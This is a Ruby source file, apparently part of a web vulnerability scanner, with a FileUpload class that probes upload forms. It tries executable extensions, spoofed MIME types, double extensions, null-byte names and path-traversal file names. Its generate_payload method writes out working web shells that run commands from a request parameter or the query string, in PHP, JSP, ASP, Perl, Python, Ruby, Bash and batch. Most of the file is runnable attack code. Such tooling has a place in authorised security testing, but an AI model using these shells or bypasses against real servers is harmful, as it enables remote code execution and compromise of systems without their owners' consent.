require 'uri'
require_relative '../utils/network'
require_relative '../utils/colorize'

class FileUpload
  EXTENSIONS = %w[php php3 php4 php5 phtml pht jsp jspx asp aspx asa ashx cgi pl py rb sh bat cmd exe com scr vbs js html htm xml svg]

  def self.test_file_upload(url, field_name = 'file')
    results = []
    
    EXTENSIONS.each do |ext|
      payload = generate_payload(ext)
      result = upload_file(url, field_name, payload, ext)
      if result && result[:uploaded]
        puts Colorize.red("File uploaded: #{result[:filename]}")
        results << result
      end
    end
    
    results
  end

  def self.test_mime_bypass(url, field_name = 'file')
    results = []
    
    mime_types = {
      'php' => ['image/jpeg', 'image/png', 'image/gif', 'text/plain', 'application/octet-stream'],
      'jsp' => ['image/jpeg', 'text/plain'],
      'asp' => ['image/jpeg', 'text/plain'],
      'aspx' => ['image/jpeg', 'text/plain']
    }
    
    mime_types.each do |ext, mimes|
      mimes.each do |mime|
        payload = generate_payload(ext)
        result = upload_file(url, field_name, payload, ext, mime)
        if result && result[:uploaded]
          puts Colorize.red("MIME bypass successful: #{ext} as #{mime}")
          results << result
        end
      end
    end
    
    results
  end

  def self.test_double_extension(url, field_name = 'file')
    results = []
    
    double_exts = %w[php.jpg jsp.png asp.gif aspx.jpg php.txt jsp.txt asp.txt]
    
    double_exts.each do |ext|
      payload = generate_payload(ext.split('.').first)
      result = upload_file(url, field_name, payload, ext)
      if result && result[:uploaded]
        puts Colorize.red("Double extension bypass: #{ext}")
        results << result
      end
    end
    
    results
  end

  def self.test_null_byte(url, field_name = 'file')
    results = []
    
    EXTENSIONS.each do |ext|
      null_ext = "#{ext}\x00.jpg"
      payload = generate_payload(ext)
      result = upload_file(url, field_name, payload, null_ext)
      if result && result[:uploaded]
        puts Colorize.red("Null byte bypass: #{ext}")
        results << result
      end
    end
    
    results
  end

  def self.test_path_traversal(url, field_name = 'file')
    paths = ['../', '..\\', '../../', '..%2F', '%2e%2e%2f']
    
    paths.each do |path|
      filename = "#{path}test.php"
      payload = generate_payload('php')
      result = upload_file(url, field_name, payload, filename)
      if result && result[:uploaded]
        puts Colorize.red("Path traversal: #{filename}")
        return result
      end
    end
    
    nil
  end

  def self.generate_payload(ext)
    case ext
    when 'php', 'php3', 'php4', 'php5', 'phtml', 'pht'
      "<?php system($_GET['cmd']); ?>"
    when 'jsp', 'jspx'
      "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"
    when 'asp', 'aspx', 'asa', 'ashx'
      "<%eval request(\"cmd\")%>"
    when 'cgi', 'pl'
      "#!/usr/bin/perl\nsystem($ENV{'QUERY_STRING'});"
    when 'py'
      "#!/usr/bin/python\nimport os\nos.system(os.environ.get('QUERY_STRING'))"
    when 'rb'
      "#!/usr/bin/ruby\nsystem(ENV['QUERY_STRING'])"
    when 'sh', 'bash'
      "#!/bin/bash\neval $QUERY_STRING"
    when 'bat', 'cmd'
      "@echo off\n%QUERY_STRING%"
    else
      "test"
    end
  end

  def self.upload_file(url, field_name, content, filename, mime_type = nil)
    begin
      boundary = "----WebKitFormBoundary#{Time.now.to_i}"
      body = []
      body << "--#{boundary}"
      body << "Content-Disposition: form-data; name=\"#{field_name}\"; filename=\"#{filename}\""
      body << "Content-Type: #{mime_type || 'application/octet-stream'}"
      body << ""
      body << content
      body << "--#{boundary}--"
      
      response = Network.http_request(url, :post, {
        'Content-Type' => "multipart/form-data; boundary=#{boundary}"
      }, body.join("\r\n"))
      
      return nil unless response
      
      {
        uploaded: response.code == "200" || response.code == "201",
        filename: filename,
        status: response.code,
        location: extract_upload_location(response)
      }
    rescue
      nil
    end
  end

  def self.extract_upload_location(response)
    body = response.body
    
    patterns = [
      /upload[^"']*["']([^"']+)["']/i,
      /file[^"']*["']([^"']+)["']/i,
      /location[^"']*["']([^"']+)["']/i,
      /href=["']([^"']*upload[^"']*)["']/i
    ]
    
    patterns.each do |pattern|
      match = body.match(pattern)
      return match[1] if match
    end
    
    nil
  end
end

